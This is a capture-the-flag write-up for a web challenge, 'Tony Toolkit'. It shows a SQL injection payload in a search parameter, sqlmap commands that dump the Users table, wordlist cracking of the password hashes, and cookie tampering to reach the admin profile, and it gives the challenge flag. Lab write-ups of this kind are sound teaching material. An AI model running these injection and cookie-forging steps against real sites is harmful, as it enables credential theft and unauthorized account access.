# Challenge Name: Tony Toolkit

## Description

Tony decided to launch bug bounties on his website for the first time, so it's likely to have some very common vulnerabilities.

**Challenge URL:** `http://chall.0xfun.org:726`

---

## Writeup

### Step 1: Exploring the Site

Inspect the home and login pages. Nothing obvious in the HTML; the **search** functionality (e.g. `GET /search?item=...`) is a good candidate for injection.

### Step 2: SQL Injection in Search

Try a classic SQLi in the `item` parameter:

```
GET /search?item=admin' OR 1=1 --
```

If the response returns all (or more) results, the parameter is vulnerable. Confirm with **sqlmap**:

```bash
sqlmap -u "http://chall.0xfun.org:726/search?item=tool" --dbs
```

The backend is **SQLite**. Enumerate tables:

```bash
sqlmap -u "http://chall.0xfun.org:726/search?item=tool" --tables
# e.g. Products, Users, sqlite_sequence
```

### Step 3: Dumping Users and Cracking Passwords

Dump the **Users** table:

```bash
sqlmap -u "http://chall.0xfun.org:726/search?item=tool" -T Users --dump
```

Crack the password hashes (e.g. SHA-256) with a wordlist (e.g. rockyou.txt). One user (e.g. **Jerry**) may crack to something like `1qaz2wsx`. **Admin** may have a null or empty hash.

### Step 4: Logging In and Cookie Tampering

Log in as Jerry to obtain a session (cookie: `userID=2`, `user=<hash>`). Visit `/user` to see their profile. Then change the cookie to **userID=1** (Admin) while keeping the same `user` value. Reload `/user`.

### Step 5: Reading the Flag

The profile for userID 1 returns the flag in the HTML (possibly HTML-encoded, e.g. `&#39;` for apostrophe). Decode and submit:

```
0xfun{T0ny'5_T00ly4rd._1_H0p3_Y0u_H4d_Fun_SQL1ng,_H45H_Cr4ck1ng,_4nd_W1th_C00k13_M4n1pu74t10n}
```

---

## Flag

```
0xfun{T0ny'5_T00ly4rd._1_H0p3_Y0u_H4d_Fun_SQL1ng,_H45H_Cr4ck1ng,_4nd_W1th_C00k13_M4n1pu74t10n}
```

---
